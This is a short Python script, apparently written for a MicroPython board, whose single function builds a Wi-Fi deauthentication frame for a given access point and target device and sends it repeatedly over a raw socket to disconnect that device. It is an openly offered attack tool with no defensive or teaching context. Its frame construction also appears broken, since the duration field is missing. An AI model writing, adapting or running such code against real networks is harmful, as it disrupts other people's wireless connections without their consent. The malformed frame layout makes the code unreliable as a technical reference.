import network
import usocket as socket
import time

def deauth_attack(target_mac, ap_mac, channel, duration=10):
    wlan = network.WLAN(network.STA_IF)
    wlan.active(True)
    wlan.config(channel=channel)

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    deauth_frame = (
        b'\xC0\x00' + ap_mac + target_mac + ap_mac +
        b'\x00\x00\x07\x00'
    )

    start_time = time.time()
    print(f"Starting deauth attack on channel {channel}...")
    while time.time() - start_time < duration:
        sock.send(deauth_frame)
        time.sleep(0.05)
    print("Deauth attack complete.")

